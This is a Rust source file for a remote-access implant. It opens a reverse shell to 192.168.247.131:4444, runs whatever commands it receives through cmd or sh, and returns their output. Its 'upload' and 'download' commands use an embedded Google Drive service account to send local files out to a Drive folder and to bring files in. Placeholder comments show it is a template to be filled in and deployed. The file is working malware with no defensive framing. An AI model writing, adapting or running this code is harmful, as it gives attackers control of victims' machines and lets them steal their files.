use std::net::TcpStream;
use std::io::{self, Write, Read};
use std::process::Command;
use yup_oauth2::{parse_service_account_key, ServiceAccountAuthenticator};
use std::error::Error;
use std::fs::File;
use reqwest::blocking::Client;
use reqwest::blocking::multipart::{Form, Part};
use mime;

const BUFFER_SIZE: usize = 4096;
const DELIMITER: &str = "END_OF_CMD\n";
const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; // Google Drive folder ID

// Function to execute commands
fn execute_command(command: &str) -> String {
    if command.trim().is_empty() {
        return "No command entered.".to_string();
    }

    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .arg("/C")
            .arg(command)
            .output()
            .expect("Failed to execute command")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Failed to execute command")
    };

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        return if stdout.is_empty() {
            "Command executed successfully, but no output.".to_string()
        } else {
            stdout
        };
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        return format!("Command failed: {}", stderr);
    }
}

// Upload file to Google Drive
fn upload_file_to_google_drive(file_path: &str, auth_token: &str) -> Result<String, Box<dyn Error>> {
    println!("Starting file upload: {}", file_path);

    // Read the file and create the multipart form
    let file = File::open(file_path)?;
    let file_name = std::path::Path::new(file_path).file_name().unwrap().to_str().unwrap();
    
    let metadata_part = Part::text(format!(r#"{{
        "name": "{}",
        "parents": ["{}"]
    }}"#, file_name, FOLDER_ID))
    .mime_str("application/json")?;
    
    let file_part = Part::reader(file)
        .mime_str(mime::APPLICATION_OCTET_STREAM.as_ref())?
        .file_name(file_name.to_string());

    let form = Form::new()
        .part("metadata", metadata_part)
        .part("file", file_part);

    let client = Client::new();
    let response = client.post("https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart")
        .bearer_auth(auth_token)
        .multipart(form)
        .send()?;

    let status = response.status().is_success();
    let response_text = response.text()?;

    if !status {
        return Err(format!("Upload failed: {}", response_text).into());
    }

    Ok(response_text)    
}

// Download file from Google Drive
fn download_file_from_google_drive(file_id: &str, auth_token: &str, download_path: &str) -> Result<(), Box<dyn Error>> {
    println!("Starting file download: {}", file_id); // Add logging
    let client = Client::new();
    let url = format!("https://www.googleapis.com/drive/v3/files/{}?alt=media", file_id);
    let mut response = client.get(&url)
        .bearer_auth(auth_token)
        .send()?;

    if !response.status().is_success() {
        let error_text = response.text()?;
        return Err(format!("Download failed: {}", error_text).into());
    }

    let mut file = File::create(download_path)?;
    io::copy(&mut response, &mut file)?;
    
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Embed service account JSON file
    let service_account_json = include_str!("yourjsonfilename.json"); //PUT YOUR JSON INTO SRC and put your json name here
    let service_account_key = parse_service_account_key(service_account_json)?;
    
    // Build authenticator
    let auth = ServiceAccountAuthenticator::builder(service_account_key).build().await?;
    
    // Main loop to handle incoming connections and commands
    let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");

    loop {
        let mut buffer = [0u8; BUFFER_SIZE];
        let size = stream.read(&mut buffer)?;

        if size == 0 {
            break;
        }

        let command = String::from_utf8_lossy(&buffer[..size]);
        println!("Received command: {}", command);

        // Refresh token for each operation
        let token = auth.token(&["https://www.googleapis.com/auth/drive"]).await?;
        let token = token.token().expect("Failed to get token");

        if command.starts_with("upload;") {
            let parts: Vec<&str> = command.split(';').collect();
            if parts.len() == 2 {
                let local_path = parts[1].trim();
                match upload_file_to_google_drive(local_path, &token) {
                    Ok(result) => {
                        stream.write_all(format!("Upload successful: {}\n", result).as_bytes())?;
                        stream.write_all(DELIMITER.as_bytes())?;
                    }
                    Err(e) => {
                        stream.write_all(format!("Failed to upload file: {}\n", e).as_bytes())?;
                        stream.write_all(DELIMITER.as_bytes())?;
                    }
                }
            }
        } else if command.starts_with("download;") {
            let parts: Vec<&str> = command.split(';').collect();
            if parts.len() == 3 {
                let file_id = parts[1];
                let local_path = parts[2].trim();
                match download_file_from_google_drive(file_id, &token, local_path) {
                    Ok(_) => {
                        stream.write_all(format!("File downloaded to {}\n", local_path).as_bytes())?;
                        stream.write_all(DELIMITER.as_bytes())?;
                    }
                    Err(e) => {
                        stream.write_all(format!("Failed to download file: {}\n", e).as_bytes())?;
                        stream.write_all(DELIMITER.as_bytes())?;
                    }
                }
            }
        } else {
            // Execute shell command
            let output = execute_command(&command);
            stream.write_all(output.as_bytes())?;
            stream.write_all(DELIMITER.as_bytes())?;
        }
    }

    Ok(())
}
